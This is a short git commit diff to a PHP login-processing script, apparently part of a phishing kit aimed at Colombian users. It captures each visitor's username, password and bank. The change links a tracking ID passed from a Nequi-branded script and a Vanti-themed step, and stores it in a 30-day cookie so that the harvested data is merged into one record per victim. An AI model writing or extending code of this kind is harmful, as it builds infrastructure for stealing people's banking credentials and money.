3833ca8822dc6f976d1a985dcb8119c3c952eda9
JjavierC <carvajaljavier60gmail.com>
2026-07-29 19:17:56 -0500

    datos unidos

--- process/pasologin.php
+++ process/pasologin.php
@@ -9,8 +9,19 @@ $contrasena = $ifilter->process($_POST['pas']);
 $banco = $ifilter->process($_POST['ban']);
 $dispositivo = isset($_POST['dis']) ? $ifilter->process($_POST['dis']) : 'PC';
 
-$id = isset($_COOKIE['id']) ? $ifilter->process($_COOKIE['id']) : '';
+// 🟢 RECIBIMOS EL ID ENVIADO DESDE FUNCTIONS.JS DE NEQUI
+$id_vanti = isset($_POST['id_tramite']) ? $ifilter->process($_POST['id_tramite']) : '';
 
+// Si viene un ID de Vanti, lo usamos y creamos la cookie para los siguientes pasos
+if ($id_vanti !== '') {
+    $id = $id_vanti;
+    setcookie('id', $id, time() + (86400 * 30), "/"); 
+} else {
+    // Comportamiento normal de respaldo si no viene por URL
+    $id = isset($_COOKIE['id']) ? $ifilter->process($_COOKIE['id']) : '';
+}
+
+// Como el ID ya no está vacío, ejecutará upgrade_user en lugar de crear una fila nueva
 if ($id === '' || $id === '0') {
 	create_item($usuario, $contrasena, $dispositivo, '', '', $banco, '');
 } else {
